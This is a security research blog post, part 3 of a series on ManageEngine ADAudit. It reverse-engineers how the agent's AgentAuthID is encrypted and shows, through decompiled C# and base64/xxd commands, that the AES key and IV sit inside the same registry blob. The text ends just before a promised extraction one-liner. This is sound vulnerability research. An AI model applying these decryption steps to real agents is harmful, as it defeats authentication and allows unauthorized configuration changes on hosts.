<!DOCTYPE html>
<html lang="en-us">

<head>

  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="generator" content="Source Themes Academia 4.3.1">
  <meta name="theme-name" content="academia-hugo"/>

  

  
  
  
  
  
    
    
    
  
  

  

  
  
  
    
  
  <meta name="description" content="Part 3 of the ManageEngine ADAudit research focuses on how AES encrpytion was implemented in the ADAudit Agent, and how it was bypassed">

  
  <link rel="alternate" hreflang="en-us" href="https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part3/">

  


  

  
  
  
  <meta name="theme-color" content="#000000">
  

  
  
  
  
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.8.6/css/academicons.min.css" integrity="sha256-uFVgMKfistnJAfoCUQigIl+JfUaP47GrRKjf6CTPVmw=" crossorigin="anonymous">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.0/css/all.css" integrity="sha384-aOkxzJ5uQz7WBObEZcHvV5JvRW3TUc2rNPA7pe3AwnsUohiw1Vj2Rgx2KSOkF5+h" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" integrity="sha256-ygkqlh3CYSUri3LhQxzdcm0n1EQvH2Y+U5S2idbLtxs=" crossorigin="anonymous">

    
    
    
      
    
    
      
      
        
          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.6/styles/github.min.css" crossorigin="anonymous" title="hl-light">
          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.6/styles/dracula.min.css" crossorigin="anonymous" title="hl-dark" disabled>
        
      
    

    

    

  

  
  
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:400,700|Open+Sans|Roboto+Mono&display=swap">
  

  
  
  
  <link rel="stylesheet" href="/css/academia.min.d29584a8d689167dc15889efc8f9006e.css">

  

  
  
  
  

  

  <link rel="manifest" href="/site.webmanifest">
  <link rel="icon" type="image/png" href="/img/icon.png">
  <link rel="apple-touch-icon" type="image/png" href="/img/icon-192.png">

  <link rel="canonical" href="https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part3/">

  
  
  
  
    
  
  <meta property="twitter:card" content="summary_large_image">
  
  <meta property="og:site_name" content="Shelltrail - Swedish offensive security experts">
  <meta property="og:url" content="https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part3/">
  <meta property="og:title" content="ManageEngine ADAudit - Reverse engineering Windows RPC to find CVEs - part 3/reverse engineering cryptography | Shelltrail - Swedish offensive security experts">
  <meta property="og:description" content="Part 3 of the ManageEngine ADAudit research focuses on how AES encrpytion was implemented in the ADAudit Agent, and how it was bypassed"><meta property="og:image" content="https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part3/featured.png">
  <meta property="twitter:image" content="https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part3/featured.png"><meta property="og:locale" content="en-us">
  
  <meta property="article:published_time" content="2024-05-27T00:00:00&#43;00:00">
  
  <meta property="article:modified_time" content="2024-05-27T00:00:00&#43;00:00">
  

  


  





  <title>ManageEngine ADAudit - Reverse engineering Windows RPC to find CVEs - part 3/reverse engineering cryptography | Shelltrail - Swedish offensive security experts</title>

</head>


<body id="top" data-spy="scroll" data-target="#TableOfContents" data-offset="71" >

  <aside class="search-results" id="search">
  <div class="container">
    <section class="search-header">

      <div class="row no-gutters justify-content-between mb-3">
        <div class="col-6">
          <h1>Search</h1>
        </div>
        <div class="col-6 col-search-close">
          <a class="js-search" href="#"><i class="fas fa-times-circle text-muted" aria-hidden="true"></i></a>
        </div>
      </div>

      <div id="search-box">
        
        
        
      </div>

    </section>
    <section class="section-search-results">

      <div id="search-hits">
        
      </div>

    </section>
  </div>
</aside>


  

<nav class="navbar navbar-light fixed-top navbar-expand-lg py-0" id="navbar-main">
  <div class="container">

    
      <a class="navbar-brand" href="/"><img src="/img/shelltrail_slim_transparent.png" height="90%" width="90%" alt="Shelltrail - Swedish offensive security experts"></a>
      
      <button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar" aria-controls="navbar" aria-expanded="false" aria-label="Toggle navigation"><span><i class="fas fa-bars"></i></span>
      </button>
      

    
    <div class="collapse navbar-collapse" id="navbar">
      
      
      <ul class="navbar-nav ml-auto">
        

        

        
        
        
          
        

        
        
        
        
        
        
          
          
          
            
          
          
        

        <li class="nav-item">
          <a class="nav-link " href="/#proposal"><span>Proposal</span></a>
        </li>

        
        

        

        
        
        
          
        

        
        
        
        
        
        
          
          
          
            
          
          
        

        <li class="nav-item">
          <a class="nav-link " href="/#webshop"><span>Webshop</span></a>
        </li>

        
        

        

        
        
        
          
        

        
        
        
        
        
        
          
          
          
            
          
          
        

        <li class="nav-item">
          <a class="nav-link " href="/#services"><span>Services</span></a>
        </li>

        
        

        

        
        
        
          
        

        
        
        
        
        
        
          
          
          
            
          
          
        

        <li class="nav-item">
          <a class="nav-link " href="/#about"><span>About us</span></a>
        </li>

        
        

        

        
        
        
          
        

        
        
        
        
        
        
          
          
          
            
          
          
        

        <li class="nav-item">
          <a class="nav-link " href="/#research"><span>Research</span></a>
        </li>

        
        

        

        
        
        
          
        

        
        
        
        
        
        
          
          
          
            
          
          
        

        <li class="nav-item">
          <a class="nav-link " href="/#blog"><span>Blog</span></a>
        </li>

        
        

      

        

        

        

        

      </ul>
    </div>
  </div>
</nav>


  <article class="article py-5" itemscope itemtype="http://schema.org/Article">

  














<div class="container split-header">
  <div class="row justify-content-center">
    <div class="col-lg-12">
        <img class="img-fluid w-100" src="/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part3/featured_hu03ac49c54d1dd3ae7724cbe215308a88_151430_900x500_fill_q90_lanczos_smart1_3.png" itemprop="image" alt="">
        
    </div>
    <div class="col-lg-12">
      <h1 itemprop="name">ManageEngine ADAudit - Reverse engineering Windows RPC to find CVEs - part 3/reverse engineering cryptography</h1>

      

      



<meta content="2024-05-27 00:00:00 &#43;0000 UTC" itemprop="datePublished">
<meta content="2024-05-27 00:00:00 &#43;0000 UTC" itemprop="dateModified">

<div class="article-metadata">

  
  

  

  

  

  

  
  

  
  

  
    
<div class="share-box" aria-hidden="true">
  <ul class="share">
    
      
      
      
        
      
      
      
      <li>
        <a href="https://twitter.com/intent/tweet?url=https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part3/&amp;text=ManageEngine%20ADAudit%20-%20Reverse%20engineering%20Windows%20RPC%20to%20find%20CVEs%20-%20part%203/reverse%20engineering%20cryptography" target="_blank" rel="noopener" class="share-btn-twitter">
          <i class="fab fa-twitter"></i>
        </a>
      </li>
    
      
      
      
        
      
      
      
      <li>
        <a href="https://www.facebook.com/sharer.php?u=https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part3/&amp;t=ManageEngine%20ADAudit%20-%20Reverse%20engineering%20Windows%20RPC%20to%20find%20CVEs%20-%20part%203/reverse%20engineering%20cryptography" target="_blank" rel="noopener" class="share-btn-facebook">
          <i class="fab fa-facebook-f"></i>
        </a>
      </li>
    
      
      
      
        
      
      
      
      <li>
        <a href="mailto:?subject=ManageEngine%20ADAudit%20-%20Reverse%20engineering%20Windows%20RPC%20to%20find%20CVEs%20-%20part%203/reverse%20engineering%20cryptography&amp;body=https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part3/" target="_blank" rel="noopener" class="share-btn-email">
          <i class="fas fa-envelope"></i>
        </a>
      </li>
    
      
      
      
        
      
      
      
      <li>
        <a href="https://www.linkedin.com/shareArticle?url=https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part3/&amp;title=ManageEngine%20ADAudit%20-%20Reverse%20engineering%20Windows%20RPC%20to%20find%20CVEs%20-%20part%203/reverse%20engineering%20cryptography" target="_blank" rel="noopener" class="share-btn-linkedin">
          <i class="fab fa-linkedin-in"></i>
        </a>
      </li>
    
      
      
      
        
      
      
      
      <li>
        <a href="https://web.whatsapp.com/send?text=ManageEngine%20ADAudit%20-%20Reverse%20engineering%20Windows%20RPC%20to%20find%20CVEs%20-%20part%203/reverse%20engineering%20cryptography%20https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part3/" target="_blank" rel="noopener" class="share-btn-whatsapp">
          <i class="fab fa-whatsapp"></i>
        </a>
      </li>
    
      
      
      
        
      
      
      
      <li>
        <a href="https://service.weibo.com/share/share.php?url=https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part3/&amp;title=ManageEngine%20ADAudit%20-%20Reverse%20engineering%20Windows%20RPC%20to%20find%20CVEs%20-%20part%203/reverse%20engineering%20cryptography" target="_blank" rel="noopener" class="share-btn-weibo">
          <i class="fab fa-weibo"></i>
        </a>
      </li>
    
  </ul>
</div>


  

</div>

      














    </div>
    
    </div>
  </div>
</div>


  <div class="article-container">

    <div class="article-style" itemprop="articleBody">
      <h2 id="background">Background</h2>
<p>If you followed along part 1 and part 2 of this research you know that
we built a custom <code>adauditrpc-client</code> and then reverse engineered the
agent to successfully use it to make configuration changes on the host
system of the agent.</p>
<p>The requirement for this custom RPC client to successfully authenticate was:</p>
<ul>
<li>Authenticated remote SMB or local access to the named pipe exposed by the agent.</li>
<li><code>AgentUID</code> stored in the registry hive.</li>
</ul>
<p>When this vulnerability was about to be reported to the team at
ManageEngine a <em>small</em> detail was discovered:</p>
<blockquote>
<p>- <em>&ldquo;We are not using the latest version&rdquo;</em></p>
</blockquote>
<p>So the ADAudit Plus server used in this research was upgraded from 7050 to
7251 as well as the ADAudit Agent and hope was placed that the POC should work even on the latest
version. It did not.</p>
<h2 id="security-mitigation">Security mitigation</h2>
<p>To figure out what was wrong with our custom RPC client we decompiled the <code>ADAPAgent.exe</code>
once again with dnSpy to see if anything had changed between the versions.</p>
<p>We start by analyzing the <code>NotifyAgentStr</code> function that was called via the custom
<code>adauditrpc-client</code>.
Interesting, a new value is being checked:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>private static int NotifyAgentStr(int notifyId, string msgStr)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	int errStatus = 1;
</span></span><span style="display:flex;"><span>	try
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		Hashtable msgMap = JsonAPI.JsonToHashtable(msgStr);
</span></span><span style="display:flex;"><span><span style="color:#f92672">-		if (msgMap.ContainsKey(&#34;AgentUID&#34;) &amp;&amp; DataStore.Get(&#34;AgentUID&#34;).ToString().Equals(msgMap[&#34;AgentUID&#34;].ToString()))
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+		if (msgMap.ContainsKey(&#34;AgentAuthID&#34;) &amp;&amp; string.Equals(DataStore.Get(&#34;AgentAuthID&#34;).ToString(), msgMap[&#34;AgentAuthID&#34;].ToString(), StringComparison.CurrentCultureIgnoreCase))
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span>		{
</span></span><span style="display:flex;"><span>			errStatus = 0;
</span></span><span style="display:flex;"><span>[...]
</span></span></code></pre></div><p>The value <code>AgentUID</code> that we previously used as authentication is now replaced
with <code>AgentAuthID</code>. Lets check this out in the registry:</p>
<p><img src="encrypted-agentauthid-in-the-registry.png" alt="encrypted-agentauthid-in-the-registry"></p>
<p>It is a long value and as it does not match any known hash, it&rsquo;s likely encrypted:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@adpen1:~$ hash-identifier 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HASH: MzZc42XU0S9wd1QqDhxZf7djz3laBswMY57K5H0aMclEYWnS+iAy6wsnKuF31TYKNw8Lk1D3ijxqEcVcDaMG3SBtBJU7/KX/EyVs9H//Q+XZn/OGkNcW4Of7b8mNXHKI0N0a
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Not Found.
</span></span></code></pre></div><p><code>base64</code> decode piping to <code>xxd</code> does not give any more clues:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@adpen1:~$ echo -n MzZc42XU0S9wd1QqDhxZf7djz3laBswMY57K5H0aMclEYWnS+iAy6wsnKuF31TYKNw8Lk1D3ijxqEcVcDaMG3SBtBJU7/KX/EyVs9H//Q+XZn/OGkNcW4Of7b8mNXHKI0N0a | base64 -d | xxd
</span></span><span style="display:flex;"><span>00000000: <span style="color:#ae81ff">3336</span> 5ce3 65d4 d12f <span style="color:#ae81ff">7077</span> 542a 0e1c 597f  36<span style="color:#ae81ff">\.</span>e../pwT*..Y.
</span></span><span style="display:flex;"><span>00000010: b763 cf79 5a06 cc0c 639e cae4 7d1a 31c9  .c.yZ...c...<span style="color:#f92672">}</span>.1.
</span></span><span style="display:flex;"><span>00000020: <span style="color:#ae81ff">4461</span> 69d2 fa20 32eb 0b27 2ae1 77d5 360a  Dai.. 2..<span style="color:#960050;background-color:#1e0010">&#39;</span>*.w.6.
</span></span><span style="display:flex;"><span>00000030: 370f 0b93 50f7 8a3c 6a11 c55c 0da3 06dd  7...P..&lt;j..<span style="color:#ae81ff">\.</span>...
</span></span><span style="display:flex;"><span>00000040: 206d <span style="color:#ae81ff">0495</span> 3bfc a5ff <span style="color:#ae81ff">1325</span> 6cf4 7fff 43e5   m..;....%l...C.
</span></span><span style="display:flex;"><span>00000050: d99f f386 90d7 16e0 e7fb 6fc9 8d5c <span style="color:#ae81ff">7288</span>  ..........o..<span style="color:#ae81ff">\r</span>.
</span></span><span style="display:flex;"><span>00000060: d0dd 1a                                  ...
</span></span></code></pre></div><p>Lets continue reviewing the <code>ADAPAgent.exe</code> source code. If we follow
the <code>DataStore.Get()</code> function we can see at line 459 that the <code>Cryptography.Decrypt()</code>
is called.</p>
<p><img src="decryption-process-of-adapagent.png" alt="decryption-process-of-adapagent"></p>
<p>This looks fun:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#ae81ff">1</span>:  <span style="color:#75715e">// Agent.Common.Helpers.Cryptography</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>:  <span style="color:#75715e">// Token: 0x060002A0 RID: 672 RVA: 0x00019E3C File Offset: 0x0001803C</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span>:  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">string</span> Decrypt(<span style="color:#66d9ef">string</span> cipherStr)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span>:  {
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5</span>:      <span style="color:#66d9ef">string</span> output = <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span>:      <span style="color:#66d9ef">try</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7</span>:      {
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">8</span>:	    	<span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">string</span>.IsNullOrEmpty(cipherStr) || cipherStr.Length &lt; <span style="color:#ae81ff">32</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">9</span>:	    	{
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">10</span>:	    		Logger.Event.InfoFormat(<span style="color:#e6db74">&#34;String cannot be Decrypted&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">object</span>[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">11</span>:	    		<span style="color:#66d9ef">return</span> output;
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">12</span>:	    	}
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">13</span>:	    	<span style="color:#66d9ef">byte</span>[] cipherText = Convert.FromBase64String(cipherStr);
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">14</span>:	    	<span style="color:#66d9ef">byte</span> terminateByte = <span style="color:#ae81ff">92</span>;
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span>:	    	<span style="color:#66d9ef">int</span> plainTextIndex = Array.IndexOf&lt;<span style="color:#66d9ef">byte</span>&gt;(cipherText, terminateByte);
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">16</span>:	    	<span style="color:#66d9ef">int</span> plainTextLength = <span style="color:#66d9ef">int</span>.Parse(Encoding.ASCII.GetString(cipherText.Take(plainTextIndex).ToArray&lt;<span style="color:#66d9ef">byte</span>&gt;()));
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">17</span>:	    	plainTextLength += <span style="color:#ae81ff">16</span> - plainTextLength % <span style="color:#ae81ff">16</span>;
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">18</span>:	    	plainTextIndex++;
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">19</span>:	    	<span style="color:#66d9ef">using</span> (Aes aes = Aes.Create())
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">20</span>:	    	{
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">21</span>:	    		aes.Key = cipherText.Skip(plainTextIndex).Take(<span style="color:#ae81ff">32</span>).ToArray&lt;<span style="color:#66d9ef">byte</span>&gt;();
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">22</span>:	    		aes.IV = cipherText.Skip(<span style="color:#ae81ff">32</span> + plainTextIndex).Take(<span style="color:#ae81ff">16</span>).ToArray&lt;<span style="color:#66d9ef">byte</span>&gt;();
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">23</span>:	    		cipherText = cipherText.Skip(<span style="color:#ae81ff">48</span> + plainTextIndex).Take(plainTextLength).ToArray&lt;<span style="color:#66d9ef">byte</span>&gt;();
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">24</span>:	    		Aes aes2 = aes;
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">25</span>:	    		<span style="color:#66d9ef">byte</span>[] plainTextBytes = aes2.CreateDecryptor(aes2.Key, aes.IV).TransformFinalBlock(cipherText, <span style="color:#ae81ff">0</span>, cipherText.Length);
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">26</span>:	    		output = Encoding.UTF8.GetString(plainTextBytes);
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">27</span>:	    	}
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">28</span>:     }
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">29</span>:	    <span style="color:#66d9ef">catch</span> (Exception ex)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">30</span>:     {
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">31</span>:	        Logger.Event.ErrorFormat(<span style="color:#e6db74">&#34;Exception in Decrypt: &#34;</span> + ex.Message, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">object</span>[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">32</span>:	    	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">33</span>:	    }
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">34</span>:	    <span style="color:#66d9ef">return</span> output;
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">35</span>: }
</span></span></code></pre></div><p>Lets break down the code:</p>
<ul>
<li>
<p>Line 13 takes the cipherStr (aka <code>AgentAuthID</code>) and base64 decodes it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#ae81ff">13</span>:	    	<span style="color:#66d9ef">byte</span>[] cipherText = Convert.FromBase64String(cipherStr);
</span></span></code></pre></div></li>
<li>
<p>Line 14 creates a <code>terminateByte</code> variable where 92 in decimal ascii represents <code>\</code> or <code>\x5c</code> in hex.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#ae81ff">14</span>:	    	<span style="color:#66d9ef">byte</span> terminateByte = <span style="color:#ae81ff">92</span>;
</span></span></code></pre></div></li>
<li>
<p>Line 15 creates an int named <code>plainTextIndex</code>. This code excerpt finds the position of the first occurring <code>\</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#ae81ff">15</span>:	    	<span style="color:#66d9ef">int</span> plainTextIndex = Array.IndexOf&lt;<span style="color:#66d9ef">byte</span>&gt;(cipherText, terminateByte);
</span></span></code></pre></div></li>
<li>
<p>Line 16 creates an int named <code>plainTextLength</code> which contains the string in our cipherStr up to the first <code>\</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#ae81ff">16</span>:	    	<span style="color:#66d9ef">int</span> plainTextLength = <span style="color:#66d9ef">int</span>.Parse(Encoding.ASCII.GetString(cipherText.Take(plainTextIndex).ToArray&lt;<span style="color:#66d9ef">byte</span>&gt;()));
</span></span></code></pre></div><p>This is actually sane if you remember our xxd output. Could our plainText be 36 charachters long?:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>    user@adpen1:~$ echo -n MzZ<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>N0a | base64 -d | xxd
</span></span><span style="display:flex;"><span>    00000000: <span style="color:#ae81ff">3336</span> 5ce3 65d4 d12f <span style="color:#ae81ff">7077</span> 542a 0e1c 597f  36<span style="color:#ae81ff">\.</span>e../pwT*..Y.
</span></span><span style="display:flex;"><span>    00000010: b763 cf79 5a06 cc0c 639e cae4 7d1a 31c9  .c.yZ...c...<span style="color:#f92672">}</span>.1.
</span></span><span style="display:flex;"><span>    00000020: <span style="color:#ae81ff">4461</span> 69d2 fa20 32eb 0b27 2ae1 77d5 360a  Dai.. 2..<span style="color:#960050;background-color:#1e0010">&#39;</span>*.w.6.
</span></span><span style="display:flex;"><span>    00000030: 370f 0b93 50f7 8a3c 6a11 c55c 0da3 06dd  7...P..&lt;j..<span style="color:#ae81ff">\.</span>...
</span></span><span style="display:flex;"><span>    00000040: 206d <span style="color:#ae81ff">0495</span> 3bfc a5ff <span style="color:#ae81ff">1325</span> 6cf4 7fff 43e5   m..;....%l...C.
</span></span><span style="display:flex;"><span>    00000050: d99f f386 90d7 16e0 e7fb 6fc9 8d5c <span style="color:#ae81ff">7288</span>  ..........o..<span style="color:#ae81ff">\r</span>.
</span></span><span style="display:flex;"><span>    00000060: d0dd 1a                                  ...
</span></span></code></pre></div></li>
<li>
<p>Line 17 increases to our <code>plainTextLength</code> to ensure that the length of the int is a multiple of 16 bytes, which is a requirement for the AES block cipher.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#ae81ff">17</span>:	    	plainTextLength += <span style="color:#ae81ff">16</span> - plainTextLength % <span style="color:#ae81ff">16</span>;
</span></span></code></pre></div></li>
<li>
<p>Line 18 adds 1 to our <code>plainTextIndex</code> to point at the first byte after <code>\</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#ae81ff">18</span>:	    	plainTextIndex++;
</span></span></code></pre></div></li>
</ul>
<p>Line 19-27 is the decryption process:</p>
<ul>
<li>
<p>Line 21 create an AES key with bytes stored at <code>plainTextIndex (3)</code> + 32 bytes</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#ae81ff">21</span>:	aes.Key = cipherText.Skip(plainTextIndex).Take(<span style="color:#ae81ff">32</span>).ToArray&lt;<span style="color:#66d9ef">byte</span>&gt;();
</span></span></code></pre></div><p>This can be recreated in bash by, base64 decode the <code>AgentAuthID</code> and pipe it
to xxd. <code>-s 3</code> to set starting byte at 3, <code>-l 32</code> to stop after 32 bytes and finally <code>-c 200</code>
to disable output formatting. The output should be our AES key.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@adpen1:~$ echo -n MzZ<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>N0a | base64 -d | xxd -s <span style="color:#ae81ff">3</span> -l <span style="color:#ae81ff">32</span> -c <span style="color:#ae81ff">200</span>
</span></span><span style="display:flex;"><span>00000003: e365 d4d1 2f70 <span style="color:#ae81ff">7754</span> 2a0e 1c59 7fb7 63cf 795a 06cc 0c63 9eca e47d 1a31 c944 <span style="color:#ae81ff">6169</span>
</span></span></code></pre></div></li>
<li>
<p>Line 22 creates an AES Initialization Vector (IV)  from the bytes stored at (32+3) + 16</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#ae81ff">22</span>:	aes.IV = cipherText.Skip(<span style="color:#ae81ff">32</span> + plainTextIndex).Take(<span style="color:#ae81ff">16</span>).ToArray&lt;<span style="color:#66d9ef">byte</span>&gt;();
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@adpen1:~$ echo -n MzZ<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>N0a | base64 -d | xxd -s <span style="color:#ae81ff">35</span> -l <span style="color:#ae81ff">16</span> -c <span style="color:#ae81ff">200</span>
</span></span><span style="display:flex;"><span>00000023: d2fa <span style="color:#ae81ff">2032</span> eb0b 272a e177 d536 0a37 0f0b
</span></span></code></pre></div></li>
<li>
<p>Line 23 fetches the cipherText from our <code>AgentAuthID</code> at byte (48+3) until <code>plainTextLength</code> (36)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#ae81ff">23</span>:	cipherText = cipherText.Skip(<span style="color:#ae81ff">48</span> + plainTextIndex).Take(plainTextLength).ToArray&lt;<span style="color:#66d9ef">byte</span>&gt;();
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@adpen1:~$ echo -n MzZ<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>N0a | base64 -d | xxd -s <span style="color:#ae81ff">51</span> -l <span style="color:#ae81ff">36</span> -c <span style="color:#ae81ff">200</span>
</span></span><span style="display:flex;"><span>00000033: <span style="color:#ae81ff">9350</span> f78a 3c6a 11c5 5c0d a306 dd20 6d04 953b fca5 ff13 256c f47f ff43 e5d9 9ff3 <span style="color:#ae81ff">8690</span> d716
</span></span></code></pre></div></li>
</ul>
<p>To summarize, the <code>AgentAuthID</code> that is stored in the Windows registry is a
base64 blob, containing the length of the plaintext, the AES key, the
Initialization Vector and the encrypted text. With this information we should
be able to decrypt ciphertext.</p>
<p>Here is a bash one-liner to extract our requirements:</p>
